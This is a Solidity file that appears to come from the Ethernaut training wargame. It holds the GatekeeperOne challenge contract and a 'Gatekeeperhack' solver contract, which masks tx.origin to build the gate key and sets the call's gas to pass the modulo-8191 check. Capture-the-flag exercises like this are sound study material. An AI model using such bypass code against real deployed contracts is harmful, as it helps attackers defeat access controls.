pragma solidity ^0.4.18;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Gatekeeperhack {
  bytes8 public gateKey_ = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;
  GatekeeperOne target_;

  function hack(uint _amount, address _target) public returns(bool) {
    target_ = GatekeeperOne(_target);
    return target_.enter.gas(_amount)(gateKey_);
    // return target_.call.gas(_amount)(bytes4(sha3("enter(bytes8)")),_gateKey8Padded);
  }
}
